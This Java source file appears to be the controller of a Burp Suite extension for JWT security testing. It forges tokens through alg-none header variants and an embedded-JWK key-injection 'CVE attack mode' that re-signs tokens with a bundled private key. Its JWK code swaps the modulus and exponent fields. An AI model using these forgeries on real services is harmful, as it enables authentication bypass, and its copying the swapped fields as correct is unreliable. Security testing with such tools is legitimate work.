package app.controllers;

import java.awt.Component;
import java.awt.FileDialog;
import java.awt.Frame;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.io.UnsupportedEncodingException;
import java.security.KeyFactory;
import java.security.interfaces.RSAPublicKey;
import java.security.spec.X509EncodedKeySpec;
import java.util.Base64;
import java.util.List;

import javax.swing.JCheckBox;
import javax.swing.JComboBox;
import javax.swing.SwingUtilities;

import com.auth0.jwt.algorithms.Algorithm;
import com.eclipsesource.json.Json;
import com.eclipsesource.json.JsonObject;

import app.algorithm.AlgorithmLinker;
import app.controllers.ReadableTokenFormat.InvalidTokenFormat;
import app.helpers.Config;
import app.helpers.Output;
import app.helpers.PublicKeyBroker;
import app.tokenposition.ITokenPosition;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IMessageEditorTab;
import gui.JWTInterceptTab;
import model.CustomJWToken;
import model.JWTInterceptModel;
import model.Settings;
import model.Strings;
import model.TimeClaim;


// used in the proxy intercept and repeater tabs
public class JWTInterceptTabController implements IMessageEditorTab {

	private JWTInterceptModel jwtIM;
	private JWTInterceptTab jwtST;
	private IExtensionHelpers helpers;
	private byte[] message;
	private ITokenPosition tokenPosition;
	private boolean dontModify;
	private boolean randomKey;
	private boolean keepOriginalSignature;
	private boolean chooseSignature;
	private boolean recalculateSignature;
	private String algAttackMode;
	private boolean cveAttackMode;
	private boolean edited;

	public JWTInterceptTabController(IBurpExtenderCallbacks callbacks, JWTInterceptModel jwIM, JWTInterceptTab jwtST) {
		this.jwtIM = jwIM;
		this.jwtST = jwtST;
		this.helpers = callbacks.getHelpers();
		
		createAndRegisterActionListeners(jwtST);
	}

	private void cveAttackChanged() {
		JCheckBox jcb = jwtST.getCVEAttackCheckBox();
		cveAttackMode = jcb.isSelected();
		jwtST.getNoneAttackComboBox().setEnabled(!cveAttackMode);
		jwtST.getRdbtnDontModify().setEnabled(!cveAttackMode);
		jwtST.getRdbtnOriginalSignature().setEnabled(!cveAttackMode);
		jwtST.getRdbtnRandomKey().setEnabled(!cveAttackMode);
		jwtST.getRdbtnRecalculateSignature().setEnabled(!cveAttackMode);
		jwtST.setKeyFieldState(!cveAttackMode);
		jwtST.getCVECopyBtn().setVisible(cveAttackMode);
		if (cveAttackMode) {
			jwtST.getRdbtnDontModify().setSelected(true);
			jwtST.getRdbtnOriginalSignature().setSelected(false);
			jwtST.getRdbtnRandomKey().setSelected(false);
			jwtST.getRdbtnRecalculateSignature().setSelected(false);
		} else {
			jwtST.setKeyFieldValue("");
			jwtST.setKeyFieldState(false);
		}
	}

	private void algAttackChanged() {
		JComboBox<String> jCB = jwtST.getNoneAttackComboBox();
		switch (jCB.getSelectedIndex()) {
		default:
		case 0:
			algAttackMode = null;
			break;
		case 1:
			algAttackMode = "none";
			break;
		case 2:
			algAttackMode = "None";
			break;
		case 3:
			algAttackMode = "nOnE";
			break;
		case 4:
			algAttackMode = "NONE";
			break;
		}
	}

	private void radioButtonChanged(boolean cDM, boolean cRK, boolean cOS, boolean cRS, boolean cCS) {
		boolean oldRandomKey = randomKey;

		dontModify = jwtST.getRdbtnDontModify().isSelected();
		randomKey = jwtST.getRdbtnRandomKey().isSelected();
		keepOriginalSignature = jwtST.getRdbtnOriginalSignature().isSelected();
		recalculateSignature = jwtST.getRdbtnRecalculateSignature().isSelected();
		chooseSignature = jwtST.getRdbtnChooseSignature().isSelected();

		jwtST.setKeyFieldState(!keepOriginalSignature && !dontModify && !randomKey && !chooseSignature);

		if (keepOriginalSignature || dontModify) {
			jwtIM.setJWTKey("");
			jwtST.setKeyFieldValue("");
		}
		if (randomKey && !oldRandomKey) {
			generateRandomKey();
		}
		if (cCS) {
			FileDialog dialog = new FileDialog((Frame) null, "Select File to Open");
			dialog.setMode(FileDialog.LOAD);
			dialog.setVisible(true);
			if(dialog.getFile()!=null) {
				String file = dialog.getDirectory() + dialog.getFile();
				Output.output(file + " chosen.");
				String chosen = Strings.filePathToString(file);
				jwtIM.setJWTKey(chosen);
				jwtST.updateSetView(false);	
			}
		}
	}

	private RSAPublicKey loadPublicKey() {
		String publicPEM = Config.cveAttackModePublicKey.replaceAll("\\n", "").replace("-----BEGIN PUBLIC KEY-----", "")
				.replace("-----END PUBLIC KEY-----", "");
		;
		KeyFactory kf;
		try {
			kf = KeyFactory.getInstance("RSA");
			X509EncodedKeySpec keySpecX509 = new X509EncodedKeySpec(Base64.getDecoder().decode(publicPEM));
			return (RSAPublicKey) kf.generatePublic(keySpecX509);
		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}

	private void generateRandomKey() {
		SwingUtilities.invokeLater(new Runnable() {
			@Override
			public void run() {
				CustomJWToken token = null;
				try {
					token = ReadableTokenFormat.getTokenFromReadableFormat(jwtST.getJWTfromArea());
					Output.output("Generating Random Key for Signature Calculation");
					String randomKey = AlgorithmLinker.getRandomKey(token.getAlgorithm());
					Output.output("RandomKey generated: " + randomKey);
					jwtIM.setJWTKey(randomKey);
					jwtST.updateSetView(false);
				} catch (InvalidTokenFormat invalidTokenFormat) {
					invalidTokenFormat.printStackTrace();
				}
			}
		});
	}

	@Override
	public boolean isEnabled(byte[] content, boolean isRequest) {
		return ITokenPosition.findTokenPositionImplementation(content, isRequest, helpers) != null;
	}

	@Override
	public void setMessage(byte[] content, boolean isRequest) {
		edited = false;
		tokenPosition = ITokenPosition.findTokenPositionImplementation(content, isRequest, helpers);
		jwtIM.setcFW(tokenPosition.getcFW());
		if (tokenPosition == null) {
			jwtST.updateSetView(true);
		} else {
			jwtIM.setJWT(tokenPosition.getToken());
			CustomJWToken cJWT = new CustomJWToken(jwtIM.getJWT());
			List<TimeClaim> tcl = cJWT.getTimeClaimList();
			jwtIM.setTimeClaims(tcl);
			jwtIM.setJWTJSON(ReadableTokenFormat.getReadableFormat(cJWT));
			jwtIM.setSignature(cJWT.getSignature());
			jwtST.updateSetView(Config.resetEditor);
			algAttackMode = null;
			if(Config.resetEditor) {
				jwtST.getNoneAttackComboBox().setSelectedIndex(0);				
			}
		}
		this.message = content;
	}

	@Override
	public byte[] getMessage() {
		// see https://github.com/PortSwigger/example-custom-editor-tab/blob/master/java/BurpExtender.java#L119		
		boolean changesPerformed = jwtST.jwtWasChanged();
		if(!changesPerformed && !recalculateSignature && !randomKey && !chooseSignature && algAttackMode==null && !cveAttackMode) {
			return this.message;
		}
		
		jwtIM.setProblemDetail("");
		radioButtonChanged(true, false, false, false, false);
		jwtST.getCVEAttackCheckBox().setSelected(false);
		CustomJWToken token = null;
		try {
			token = ReadableTokenFormat.getTokenFromReadableFormat(jwtST.getJWTfromArea());
		} catch (InvalidTokenFormat e) {
			jwtIM.setProblemDetail(e.getMessage());
			return this.message;
		}

		if ((recalculateSignature || randomKey || chooseSignature)) {
			edited = true;
			if (recalculateSignature) {
				String cleanKey = jwtST.getKeyFieldValue().replaceAll("\\n", "").replace("-----BEGIN PRIVATE KEY-----", "").replace("-----END PRIVATE KEY-----", "");
				jwtIM.setJWTKey(cleanKey);
			}
			Algorithm algo;
			try {
				Output.output("Recalculating Signature with Secret - '" + jwtIM.getJWTKey() + "'");
				algo = AlgorithmLinker.getSignerAlgorithm(token.getAlgorithm(), jwtIM.getJWTKey());
				token.calculateAndSetSignature(algo);
				addLogHeadersToRequest();
			} catch (IllegalArgumentException | UnsupportedEncodingException e) {
				Output.outputError(e.getStackTrace().toString());
			}
		} else if (keepOriginalSignature) {
			jwtIM.setSignature(jwtIM.getOriginalSignature());
		}
		if (algAttackMode != null) {
			edited = true;
			String header = token.getHeaderJson();
			token.setHeaderJson(header.replace(token.getAlgorithm(), algAttackMode));
			token.setSignature("");
		}
		if (cveAttackMode) {
			edited = true;
			String headerJSON = token.getHeaderJson();
			JsonObject headerJSONObj = Json.parse(headerJSON).asObject();
			headerJSONObj.set("alg", "RS256");
			JsonObject jwk = new JsonObject();
			jwk.add("kty", "RSA");
			jwk.add("kid", "jwt4b@portswigger.net");
			jwk.add("use", "sig");
			RSAPublicKey pk = loadPublicKey();
			jwk.add("n", Base64.getUrlEncoder().encodeToString(pk.getPublicExponent().toByteArray()));
			jwk.add("e", Base64.getUrlEncoder().encodeToString(pk.getModulus().toByteArray()));
			headerJSONObj.add("jwk", jwk);
			token.setHeaderJson(headerJSONObj.toString());
			Algorithm algo;
			try {
				algo = AlgorithmLinker.getSignerAlgorithm(token.getAlgorithm(), Config.cveAttackModePrivateKey);
				token.calculateAndSetSignature(algo);
			} catch (UnsupportedEncodingException e) {
				Output.outputError("Failed to sign when using cve attack mode");
				e.printStackTrace();
			}
		}		
		// token may be null, if it is invalid JSON, if so, don't try changing anything
		if(token.getToken()!=null) {
			this.message = this.tokenPosition.replaceToken(token.getToken());
		}
		return this.message;
	}

	private void addLogHeadersToRequest() {
		this.tokenPosition.cleanJWTHeaders();
		this.tokenPosition.addHeader(Strings.JWTHeaderInfo);
		this.tokenPosition.addHeader(Strings.JWTHeaderPrefix + "SIGNER-KEY " + jwtIM.getJWTKey());
		if (PublicKeyBroker.publicKey != null) {
			this.tokenPosition.addHeader(Strings.JWTHeaderPrefix + "SIGNER-PUBLIC-KEY " + PublicKeyBroker.publicKey);
			PublicKeyBroker.publicKey = null;
		}
	}

	@Override
	public String getTabCaption() {
		return Settings.tabname;
	}

	@Override
	public Component getUiComponent() {
		return jwtST;
	}

	@Override
	public boolean isModified() {
		return edited;
	}

	@Override
	public byte[] getSelectedData() {
		return jwtST.getSelectedData().getBytes();
	}
	
	private void createAndRegisterActionListeners(JWTInterceptTab jwtST) {
		jwtST.getJwtArea().addKeyListener(new KeyListener() {
			@Override
			public void keyTyped(KeyEvent arg0) {
			}
			@Override
			public void keyReleased(KeyEvent arg0) {
			}
			@Override
			public void keyPressed(KeyEvent arg0) {
				edited = true;
			}
		});

		ActionListener dontModifyListener = new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				radioButtonChanged(true, false, false, false, false);
			}
		};
		ActionListener randomKeyListener = new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				radioButtonChanged(false, true, false, false, false);
			}
		};
		ActionListener originalSignatureListener = new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				radioButtonChanged(false, false, true, false, false);
			}
		};
		ActionListener recalculateSignatureListener = new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				radioButtonChanged(false, false, false, true, false);
			}
		};
		ActionListener chooseSignatureListener = new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				radioButtonChanged(false, false, false, false, true);
			}
		};
		ActionListener algAttackListener = new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				algAttackChanged();
			}
		};
		ActionListener cveAttackListener = new ActionListener() {
			@Override
			public void actionPerformed(ActionEvent e) {
				cveAttackChanged();
			}
		};

		jwtST.registerActionListeners(dontModifyListener, randomKeyListener, originalSignatureListener,
				recalculateSignatureListener, chooseSignatureListener, algAttackListener, cveAttackListener);
	}
}
